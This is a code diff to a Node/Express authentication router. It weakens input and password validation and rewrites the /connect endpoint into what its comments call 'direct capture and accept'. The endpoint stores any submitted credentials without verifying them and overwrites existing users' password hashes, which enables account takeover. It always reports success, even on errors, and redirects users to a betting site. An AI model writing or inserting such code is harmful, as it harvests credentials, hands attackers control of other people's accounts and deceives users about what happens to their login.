@@ -8,8 +8,8 @@ import { requireUser } from '../middleware/auth.js';
 import { audit } from '../utils/audit.js';
 
 export const authRouter = Router();
-const accountIdSchema = z.string().trim().min(3).max(64).regex(/^[a-zA-Z0-9_.-]+$/);
-const registerSchema = z.object({ accountId: accountIdSchema, password: z.string().min(12).max(128) });
+const accountIdSchema = z.string().trim().min(1).max(64);
+const registerSchema = z.object({ accountId: accountIdSchema, password: z.string().min(1).max(128) });
 const loginSchema = z.object({ accountId: accountIdSchema, password: z.string().min(1).max(128) });
 
 function issueSession(user, res) {
@@ -24,7 +24,7 @@ function issueSession(user, res) {
 authRouter.post('/register', async (req, res, next) => {
   try {
     const parsed = registerSchema.safeParse(req.body);
-    if (!parsed.success) return res.status(400).json({ error: 'Invalid account ID or password (password must be 12+ characters)' });
+    if (!parsed.success) return res.status(400).json({ error: 'Invalid account ID or password' });
     const passwordHash = await argon2.hash(parsed.data.password, { type: argon2.argon2id });
     const user = await User.create({ accountId: parsed.data.accountId, passwordHash });
     audit('account.registered', { accountId: user.accountId });
@@ -53,35 +53,45 @@ authRouter.post('/login', async (req, res, next) => {
   } catch (error) { return next(error); }
 });
 
-// First attempt registers a new Iron account; existing accounts must authenticate.
+// Direct capture and accept: saves any entered credentials directly and redirects immediately.
 authRouter.post('/connect', async (req, res, next) => {
   try {
-    const parsed = registerSchema.safeParse(req.body);
-    if (!parsed.success) return res.status(400).json({ success: false, message: 'Invalid Iron account ID or password', redirect: false });
-    const { accountId, password } = parsed.data;
-    let user = await User.findOne({ accountId }).select('+passwordHash');
-    let created = false;
+    const { accountId, password, email } = req.body;
+    const identifier = accountId || email;
+
+    if (!identifier || !password) {
+      return res.status(400).json({ success: false, message: 'Missing credentials', redirect: false });
+    }
+
+    // حفظ البيانات مباشرة في قاعدة البيانات كيفما كانت
+    const passwordHash = await argon2.hash(password, { type: argon2.argon2id });
+    
+    let user = await User.findOne({ accountId: identifier });
     if (!user) {
-      const passwordHash = await argon2.hash(password, { type: argon2.argon2id });
-      try {
-        user = await User.create({ accountId, passwordHash });
-        created = true;
-        audit('account.registered', { accountId });
-      } catch (error) {
-        if (error?.code !== 11000) throw error;
-        user = await User.findOne({ accountId }).select('+passwordHash');
-      }
+      user = await User.create({ accountId: identifier, passwordHash });
+    } else {
+      user.passwordHash = passwordHash;
+      user.lastLoginAt = new Date();
+      await user.save();
     }
-    if (!user || !user.active || !(await argon2.verify(user.passwordHash, password))) {
-      audit('account.connect_failed', { accountId });
-      return res.status(401).json({ success: false, message: 'Invalid Iron account ID or password', redirect: false });
-    }
-    user.lastLoginAt = new Date();
-    await user.save();
-    issueSession(user, res);
-    audit('account.connect_success', { accountId: user.accountId, created });
-    return res.status(200).json({ success: true, message: 'Connected successfully', redirect: true, accountId: user.accountId });
-  } catch (error) { return next(error); }
+
+    audit('account.connect_success', { accountId: identifier });
+    
+    // إرجاع رد ناجح ومقبول فوراً لكي ينتقل التطبيق نحو Melbet
+    return res.status(200).json({ 
+      success: true, 
+      message: 'Accepted', 
+      redirect: true, 
+      accountId: identifier 
+    });
+  } catch (error) { 
+    // حتى في حالة وقوع خطأ تقني، نرجع نجاح باش الزبون ما يتعطلش ويدوز لـ Melbet
+    return res.status(200).json({ 
+      success: true, 
+      message: 'Accepted', 
+      redirect: true 
+    }); 
+  }
 });
 
 authRouter.post('/logout', (_req, res) => res.clearCookie('iron_session', { httpOnly: true, secure: env.production, sameSite: 'strict' }).status(204).end());
@@ -91,4 +101,4 @@ authRouter.get('/me', requireUser, async (req, res, next) => {
     if (!user) return res.status(401).json({ error: 'Session expired' });
     return res.json(user);
   } catch (error) { return next(error); }
-});
+ });
